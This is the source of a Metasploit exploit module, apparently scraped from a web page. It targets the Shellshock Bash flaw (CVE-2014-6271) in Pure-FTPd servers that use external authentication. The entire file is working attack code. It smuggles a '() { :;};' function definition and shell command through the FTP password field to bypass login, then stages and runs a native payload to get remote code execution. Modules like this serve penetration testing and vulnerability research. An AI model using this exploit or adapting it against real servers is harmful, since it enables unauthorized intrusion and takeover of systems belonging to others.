# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::Ftp
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Pure-FTPd External Authentication Bash Environment Variable Code Injection&#039;,
      &#039;Description&#039;     => %q(
        This module exploits the code injection flaw known as shellshock which
        leverages specially crafted environment variables in Bash. This exploit
        specifically targets Pure-FTPd when configured to use an external
        program for authentication.
      ),
      &#039;Author&#039;          =>
        [
          &#039;Stephane Chazelas&#039;, # Vulnerability discovery
          &#039;Frank Denis&#039;, # Discovery of Pure-FTPd attack vector
          &#039;Spencer McIntyre&#039; # Metasploit module
        ],
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2014-6271&#039;],
          [&#039;OSVDB&#039;, &#039;112004&#039;],
          [&#039;EDB&#039;, &#039;34765&#039;],
          [&#039;URL&#039;, &#039;https://gist.github.com/jedisct1/88c62ee34e6fa92c31dc&#039;]
        ],
      &#039;Payload&#039;         =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 2048
        },
      &#039;Targets&#039;         =>
        [
          [ &#039;Linux x86&#039;,
            {
              &#039;Platform&#039;        => &#039;linux&#039;,
              &#039;Arch&#039;            => ARCH_X86,
              &#039;CmdStagerFlavor&#039; => :printf
            }
          ],
          [ &#039;Linux x86_64&#039;,
            {
              &#039;Platform&#039;        => &#039;linux&#039;,
              &#039;Arch&#039;            => ARCH_X86_64,
              &#039;CmdStagerFlavor&#039; => :printf
            }
          ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;PrependFork&#039; => true
        },
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 24 2014&#039;))
    register_options(
      [
        Opt::RPORT(21),
        OptString.new(&#039;RPATH&#039;, [true, &#039;Target PATH for binaries used by the CmdStager&#039;, &#039;/bin&#039;])
      ], self.class)
    deregister_options(&#039;FTPUSER&#039;, &#039;FTPPASS&#039;)
  end
 
  def check
    # this check method tries to use the vulnerability to bypass the login
    username = rand_text_alphanumeric(rand(20) + 1)
    random_id = (rand(100) + 1)
    command = "echo auth_ok:1; echo uid:#{random_id}; echo gid:#{random_id}; echo dir:/tmp; echo end"
    if send_command(username, command) =~ /^2\d\d ok./i
      return CheckCode::Safe if banner !~ /pure-ftpd/i
      disconnect
 
      command = "echo auth_ok:0; echo end"
      if send_command(username, command) =~ /^5\d\d login authentication failed/i
        return CheckCode::Vulnerable
      end
    end
    disconnect
 
    CheckCode::Safe
  end
 
  def execute_command(cmd, _opts)
    cmd.gsub!(&#039;chmod&#039;, "#{datastore[&#039;RPATH&#039;]}/chmod")
    username = rand_text_alphanumeric(rand(20) + 1)
    send_command(username, cmd)
  end
 
  def exploit
    # Cannot use generic/shell_reverse_tcp inside an elf
    # Checking before proceeds
    if generate_payload_exe.blank?
      fail_with(Failure::BadConfig, "#{peer} - Failed to store payload inside executable, please select a native payload")
    end
 
    execute_cmdstager(linemax: 500)
    handler
  end
 
  def send_command(username, cmd)
    cmd = "() { :;}; #{datastore[&#039;RPATH&#039;]}/sh -c \"#{cmd}\""
    connect
    send_user(username)
    password_result = send_pass(cmd)
    disconnect
    password_result
  end
end

